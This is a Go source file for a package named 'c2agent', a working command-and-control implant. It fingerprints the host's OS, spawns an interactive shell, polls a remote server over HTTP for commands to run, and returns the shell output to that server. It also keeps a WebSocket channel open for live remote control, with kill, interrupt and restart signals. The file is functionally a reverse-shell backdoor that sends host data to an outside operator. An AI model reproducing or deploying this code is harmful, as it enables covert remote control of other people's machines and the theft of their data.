package c2agent

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/creack/pty"
	"github.com/gorilla/websocket"
)

const (
	retryDelay = 5 * time.Second
	bufSize    = 4096
)

type Config struct {
	ServerURL    string
	ServerWS     string
	PollInterval time.Duration
	IdleTimeout  time.Duration
	Hostname     string
}

type Agent struct {
	cfg Config

	hostname string
	osInfo   string

	ptyFile  *os.File
	ptyCmd   *exec.Cmd
	ptyMu    sync.Mutex
	shellIn  io.WriteCloser
	shellCmd *exec.Cmd
	shellMu  sync.Mutex

	outputCh chan string
	wsActive int32
	wsOut    chan string
	wsOutMu  sync.Mutex
	wakeUp   chan struct{}
	stopCh   chan struct{}
}

func New(cfg Config) *Agent {
	if cfg.PollInterval == 0 {
		cfg.PollInterval = 5 * time.Minute
	}
	if cfg.IdleTimeout == 0 {
		cfg.IdleTimeout = 10 * time.Minute
	}
	return &Agent{
		cfg:      cfg,
		outputCh: make(chan string, 1024),
		wakeUp:   make(chan struct{}, 1),
		stopCh:   make(chan struct{}),
	}
}

func (a *Agent) Start() error {
	a.hostname = a.cfg.Hostname
	if a.hostname == "" {
		h, _ := os.Hostname()
		if h == "" {
			h = "unknown-" + generateSuffix()
		}
		a.hostname = h
	}
	a.osInfo = detectOS()

	fmt.Printf("[agent] hostname : %s\n", a.hostname)
	fmt.Printf("[agent] os       : %s\n", a.osInfo)
	fmt.Printf("[agent] server   : %s\n", a.cfg.ServerURL)

	if err := a.startShell(); err != nil {
		return fmt.Errorf("shell error: %w", err)
	}
	fmt.Println("[agent] shell ready")

	go a.outputSender()
	go a.signalPoller()
	go func() {
		time.Sleep(500 * time.Millisecond)
		a.runWebSocket()
	}()
	go a.commandPoller()

	return nil
}

func (a *Agent) Stop() {
	close(a.stopCh)
	a.killShell()
}

func (a *Agent) pollParams() string {
	v := url.Values{}
	v.Set("hostname", a.hostname)
	v.Set("os", a.osInfo)
	return v.Encode()
}

func (a *Agent) httpClient(timeout time.Duration) *http.Client {
	return &http.Client{Timeout: timeout}
}

func (a *Agent) startShell() error {
	if runtime.GOOS == "windows" {
		return a.startShellPipe()
	}
	return a.startShellPTY()
}

func (a *Agent) startShellPTY() error {
	a.ptyMu.Lock()
	defer a.ptyMu.Unlock()

	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/bash"
	}

	cmd := exec.Command(shell, "-i")
	cmd.Env = append(os.Environ(),
		"TERM=xterm-256color",
		"PYTHONUNBUFFERED=1",
		"FORCE_COLOR=1",
	)

	f, err := pty.Start(cmd)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[agent] PTY unavailable (%v), fallback to pipe\n", err)
		return a.startShellPipe()
	}

	a.ptyFile = f
	a.ptyCmd = cmd

	go func() {
		buf := make([]byte, bufSize)
		for {
			n, err := f.Read(buf)
			if n > 0 {
				data := make([]byte, n)
				copy(data, buf[:n])
				select {
				case a.outputCh <- string(data):
				default:
				}
			}
			if err != nil {
				return
			}
		}
	}()

	return nil
}

func (a *Agent) startShellPipe() error {
	a.shellMu.Lock()
	defer a.shellMu.Unlock()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/bash", "--norc", "--noprofile")
	}

	cmd.Env = append(os.Environ(),
		"TERM=xterm-256color",
		"PYTHONUNBUFFERED=1",
		"FORCE_COLOR=1",
		"PS1=$ ",
	)

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return err
	}

	if err := cmd.Start(); err != nil {
		return err
	}

	a.shellCmd = cmd
	a.shellIn = stdin

	readPipe := func(r io.Reader) {
		buf := make([]byte, bufSize)
		for {
			n, err := r.Read(buf)
			if n > 0 {
				data := make([]byte, n)
				copy(data, buf[:n])
				select {
				case a.outputCh <- string(data):
				default:
				}
			}
			if err != nil {
				return
			}
		}
	}
	go readPipe(stdout)
	go readPipe(stderr)

	return nil
}

func (a *Agent) killShell() {
	if runtime.GOOS != "windows" {
		a.ptyMu.Lock()
		if a.ptyCmd != nil && a.ptyCmd.Process != nil {
			a.ptyCmd.Process.Kill()
			a.ptyCmd.Wait()
			a.ptyFile.Close()
			a.ptyCmd = nil
			a.ptyFile = nil
		}
		a.ptyMu.Unlock()
	} else {
		a.shellMu.Lock()
		if a.shellCmd != nil && a.shellCmd.Process != nil {
			exec.Command("taskkill", "/F", "/T", "/PID", fmt.Sprint(a.shellCmd.Process.Pid)).Run()
			a.shellCmd.Wait()
			a.shellCmd = nil
			a.shellIn = nil
		}
		a.shellMu.Unlock()
	}
}

func (a *Agent) interruptShell() {
	if runtime.GOOS != "windows" {
		a.ptyMu.Lock()
		f := a.ptyFile
		a.ptyMu.Unlock()
		if f != nil {
			f.Write([]byte{0x03})
		}
	} else {
		a.shellMu.Lock()
		w := a.shellIn
		a.shellMu.Unlock()
		if w != nil {
			w.Write([]byte{0x03})
		}
	}
}

func (a *Agent) writeCmd(cmd string) {
	if cmd == "##WS_START##" || cmd == "##PING##" {
		return
	}
	if runtime.GOOS != "windows" {
		a.ptyMu.Lock()
		f := a.ptyFile
		a.ptyMu.Unlock()
		if f != nil {
			fmt.Fprintln(f, cmd)
		}
	} else {
		a.shellMu.Lock()
		w := a.shellIn
		a.shellMu.Unlock()
		if w != nil {
			fmt.Fprintf(w, "%s\r\n", cmd)
		}
	}
}

func (a *Agent) writeRaw(data string) {
	if runtime.GOOS != "windows" {
		a.ptyMu.Lock()
		f := a.ptyFile
		a.ptyMu.Unlock()
		if f != nil {
			io.WriteString(f, data)
		}
	} else {
		a.shellMu.Lock()
		w := a.shellIn
		a.shellMu.Unlock()
		if w != nil {
			io.WriteString(w, data)
		}
	}
}

func (a *Agent) sendResultHTTP(data string) {
	a.httpClient(10*time.Second).Post(
		a.cfg.ServerURL+"/result?"+a.pollParams(),
		"text/plain",
		bytes.NewReader([]byte(data)),
	)
}

func (a *Agent) outputSender() {
	ticker := time.NewTicker(50 * time.Millisecond)
	defer ticker.Stop()
	var buf bytes.Buffer

	flush := func() {
		if buf.Len() == 0 {
			return
		}
		data := buf.String()
		buf.Reset()

		if atomic.LoadInt32(&a.wsActive) == 1 {
			a.wsOutMu.Lock()
			ch := a.wsOut
			a.wsOutMu.Unlock()
			if ch != nil {
				select {
				case ch <- data:
					return
				default:
				}
			}
		}
		go a.sendResultHTTP(data)
	}

	for {
		select {
		case data := <-a.outputCh:
			buf.WriteString(data)
			if buf.Len() >= 4096 {
				flush()
			}
		case <-ticker.C:
			flush()
		case <-a.stopCh:
			return
		}
	}
}

func (a *Agent) commandPoller() {
	pollURL := a.cfg.ServerURL + "/poll?" + a.pollParams()
	for {
		select {
		case <-a.stopCh:
			return
		default:
		}
		if atomic.LoadInt32(&a.wsActive) == 1 {
			time.Sleep(300 * time.Millisecond)
			continue
		}
		resp, err := a.httpClient(30 * time.Second).Get(pollURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[agent] poll err: %v\n", err)
			time.Sleep(retryDelay)
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			time.Sleep(retryDelay)
			continue
		}
		cmd := strings.TrimSpace(string(body))
		if cmd == "" {
			select {
			case <-time.After(a.cfg.PollInterval):
			case <-a.wakeUp:
			case <-a.stopCh:
				return
			}
			continue
		}
		if cmd == "##WS_START##" || cmd == "##PING##" {
			go a.runWebSocket()
			continue
		}
		a.writeCmd(cmd)
	}
}

func (a *Agent) signalPoller() {
	sigURL := a.cfg.ServerURL + "/signal_poll?" + a.pollParams()
	for {
		select {
		case <-a.stopCh:
			return
		default:
		}
		if atomic.LoadInt32(&a.wsActive) == 1 {
			time.Sleep(300 * time.Millisecond)
			continue
		}
		resp, err := a.httpClient(30 * time.Second).Get(sigURL)
		if err != nil {
			time.Sleep(retryDelay)
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			time.Sleep(retryDelay)
			continue
		}
		sig := strings.TrimSpace(string(body))
		if sig != "" {
			a.handleSignal(sig)
		} else {
			select {
			case <-time.After(a.cfg.PollInterval):
			case <-a.wakeUp:
			case <-a.stopCh:
				return
			}
		}
	}
}

func (a *Agent) handleSignal(sig string) {
	switch sig {
	case "interrupt":
		a.interruptShell()
	case "kill":
		select {
		case a.outputCh <- "\r\n[restarting shell...]\r\n":
		default:
		}
		a.killShell()
		time.Sleep(200 * time.Millisecond)
		if err := a.startShell(); err != nil {
			select {
			case a.outputCh <- "[error: " + err.Error() + "]\r\n":
			default:
			}
		} else {
			select {
			case a.outputCh <- "[shell restarted]\r\n":
			default:
			}
		}
	}
}

func (a *Agent) runWebSocket() {
	if !atomic.CompareAndSwapInt32(&a.wsActive, 0, 1) {
		return
	}
	defer atomic.StoreInt32(&a.wsActive, 0)

	ch := make(chan string, 512)
	a.wsOutMu.Lock()
	a.wsOut = ch
	a.wsOutMu.Unlock()
	defer func() {
		a.wsOutMu.Lock()
		a.wsOut = nil
		a.wsOutMu.Unlock()
	}()

	wsURL := a.cfg.ServerWS + "/ws?" + a.pollParams()
	dialer := websocket.Dialer{HandshakeTimeout: 10 * time.Second}
	ws, _, err := dialer.Dial(wsURL, nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[agent] ws err: %v\n", err)
		close(ch)
		return
	}
	defer ws.Close()

	writerDone := make(chan struct{})
	go func() {
		defer close(writerDone)
		for data := range ch {
			ws.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := ws.WriteMessage(websocket.TextMessage, []byte(data)); err != nil {
				return
			}
		}
	}()

	pingDone := make(chan struct{})
	go func() {
		defer close(pingDone)
		t := time.NewTicker(30 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-t.C:
				ws.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if err := ws.WriteMessage(websocket.PingMessage, nil); err != nil {
					return
				}
			case <-writerDone:
				return
			}
		}
	}()

	ws.SetPongHandler(func(string) error {
		ws.SetReadDeadline(time.Now().Add(90 * time.Second))
		return nil
	})

	idleTimer := time.NewTimer(a.cfg.IdleTimeout)
	defer idleTimer.Stop()

	go func() {
		<-idleTimer.C
		ws.Close()
	}()

	for {
		ws.SetReadDeadline(time.Now().Add(90 * time.Second))
		_, b, err := ws.ReadMessage()
		if err != nil {
			break
		}
		msg := string(b)
		switch msg {
		case "", "##PING##", "##WS_START##":
		case "##INTERRUPT##":
			a.interruptShell()
		case "##KILL##":
			a.handleSignal("kill")
		default:
			if !idleTimer.Stop() {
				select {
				case <-idleTimer.C:
				default:
				}
			}
			idleTimer.Reset(a.cfg.IdleTimeout)
			a.writeRaw(msg)
		}
	}

	close(ch)
	<-writerDone
	<-pingDone
}

func generateSuffix() string {
	b := make([]byte, 3)
	rand.Read(b)
	return fmt.Sprintf("%06x", b)
}

func detectOS() string {
	switch runtime.GOOS {
	case "windows":
		return detectWindowsVersion()
	case "darwin":
		return detectMacOSVersion()
	default:
		return detectLinuxDistro()
	}
}

func detectLinuxDistro() string {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		if issue, err2 := os.ReadFile("/etc/issue"); err2 == nil {
			line := strings.TrimSpace(strings.Split(string(issue), "\n")[0])
			line = strings.ReplaceAll(line, `\n`, "")
			line = strings.ReplaceAll(line, `\l`, "")
			if line != "" {
				return strings.TrimSpace(line)
			}
		}
		return "Linux"
	}
	var prettyName, name, version string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "PRETTY_NAME=") {
			prettyName = strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), `"`)
		} else if strings.HasPrefix(line, "NAME=") {
			name = strings.Trim(strings.TrimPrefix(line, "NAME="), `"`)
		} else if strings.HasPrefix(line, "VERSION_ID=") {
			version = strings.Trim(strings.TrimPrefix(line, "VERSION_ID="), `"`)
		}
	}
	if prettyName != "" {
		return prettyName
	}
	if name != "" && version != "" {
		return name + " " + version
	}
	if name != "" {
		return name
	}
	return "Linux"
}

func detectWindowsVersion() string {
	out, err := exec.Command("wmic", "os", "get", "Caption", "/value").Output()
	if err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "Caption=") {
				name := strings.TrimSpace(strings.TrimPrefix(line, "Caption="))
				if name != "" {
					return name
				}
			}
		}
	}
	out2, err2 := exec.Command("cmd", "/c", "ver").Output()
	if err2 == nil {
		ver := strings.TrimSpace(string(out2))
		if ver != "" {
			return ver
		}
	}
	return "Windows"
}

func detectMacOSVersion() string {
	out, err := exec.Command("sw_vers", "-productName").Output()
	out2, err2 := exec.Command("sw_vers", "-productVersion").Output()
	if err == nil && err2 == nil {
		return strings.TrimSpace(string(out)) + " " + strings.TrimSpace(string(out2))
	}
	return "macOS"
}
